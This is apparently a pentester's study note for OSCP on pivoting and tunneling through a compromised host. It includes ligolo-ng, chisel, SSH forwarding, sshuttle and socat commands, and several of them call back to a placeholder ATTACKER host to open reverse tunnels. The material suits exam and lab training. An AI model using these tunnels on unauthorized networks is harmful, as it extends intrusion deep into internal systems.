---
status: working
tags:
  - pivoting
  - tunneling
  - networking
  - post-exploitation
---
> *Pivoting and Tunneling:* Giving your attack box a path into a network it cannot reach directly, through a host you already own. Trigger: on a foothold, `ip a`/`ipconfig` shows a second interface on a new subnet, or `arp -a` lists hosts your box cannot ping. The whole job is choosing the right technique for what you already have on the pivot.

## The Core Decision

You pivot when a compromised host can reach a network or host that your attack box cannot. Canonical layout:

```
Attacker ── can reach ──> [ Foothold A ]  eth0 10.10.10.5  (reachable)
                                          eth1 172.16.5.5  (internal-only, second NIC)
                          ── can reach ──> [ Box B: 172.16.5.10 (DC) ]  <-- you CANNOT reach directly
                                           [ Box C: 172.16.5.11 ]       <-- only through A
```

> [!tip] Quick Chooser (pick by what you have on the pivot)
> - **SSH creds on A (Linux)?** → `sshuttle` (route, simplest), `ssh -D` (SOCKS), or `ssh -L` (one port). Nothing to upload.
> - **Only a shell, can run a binary?** → ligolo-ng (real route, all tools/scan types work). Best default.
> - **Only a shell, want a quick SOCKS proxy?** → chisel reverse SOCKS.
> - **Need to push a port inward?** → `ssh -R` or chisel reverse forward.
> - **One port from one host, minimal tooling?** → `ssh -L`, chisel single-port, or `socat`.

## ligolo-ng (preferred default, real route)

Gives your box a real route into the subnet, so internal hosts are reachable directly, full nmap scan types, every tool unmodified, clean double-pivots.

```bash
sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up   # Kali: interface
./proxy -selfcert                                                            # Kali: proxy
./agent -connect ATTACKER:11601 -ignore-cert                                 # on pivot A
sudo ip route add 172.16.5.0/24 dev ligolo                                   # Kali: after session->start
```

> [!note]
> Double-pivot (A → B → deeper subnet): run a second agent on B, `start` its session, add a route for the deeper subnet the same way. To catch a reverse shell from an internal host, use ligolo's `listener_add` to bind a port on the agent that forwards back to you.

## chisel (reverse SOCKS, workhorse when no SSH)

SOCKS proxy on your box instead of a route. Drive tools through proxychains.

```bash
./chisel server -p 8000 --reverse                          # Kali
./chisel client ATTACKER:8000 R:socks                      # pivot A (opens SOCKS on Kali:1080)
proxychains crackmapexec smb 172.16.5.0/24                 # drive a tool through it
./chisel client ATTACKER:8000 R:3389:172.16.5.10:3389      # single port instead of SOCKS
```

> [!note]
> Over SOCKS you must use TCP-connect nmap (`nmap -sT -Pn`), SYN scans do not traverse a proxy. Set proxychains to `socks5 127.0.0.1 1080` ([[11AAA - Environment Setup]]).

## SSH-based (when you have SSH creds on a Linux pivot)

```bash
ssh -D 1080 user@$IP                       # dynamic SOCKS (whole subnet, via proxychains)
ssh -L 8080:172.16.5.10:80 user@$IP        # local forward: bring ONE internal port to you
ssh -R 443:127.0.0.1:443 user@$IP          # remote forward: push YOUR port onto their network
sshuttle -r user@$IP 172.16.5.0/24         # transparent route, tools unmodified, no proxychains (TCP only)
```

> [!note]
> `ssh -L` = "bring that port to me" (an internal web app, RDP). `ssh -R` = "push my port to them" (catch a reverse shell from a host that can only see A). sshuttle is the simplest route-like option when ligolo is not available.

## socat (single-port relay, last resort)

```bash
socat TCP-LISTEN:8080,fork TCP:172.16.5.10:80    # on pivot A
```

## Troubleshooting

```bash
ip a ; ip route          # what can I reach, which interface is the pivot
nc -zv <host> <port>     # fast port-reachability check
arp -a                   # neighbor hosts your box cannot ping (often next targets)
```

> [!warning]
> Metasploit cannot be used to pivot on the OSCP (pivoting touches a second host). Use ligolo/chisel/SSH/socat. Try in order: ligolo-ng → chisel → `ssh -D` → `sshuttle` → `socat`. If DNS breaks over a tunnel, point tools at the DC's IP directly instead of a hostname.

## See Also

- [[01B - Network Scanning]] for scanning the newly reachable subnet (use `-sT -Pn` over SOCKS)
- [[05AA - Post-Exploitation Loot Loop]] for the recurse-into-new-network cycle
- [[11AAA - Environment Setup]] for the proxychains config
- Source: *OSCP Field Manual* sections 11.2, 11.3
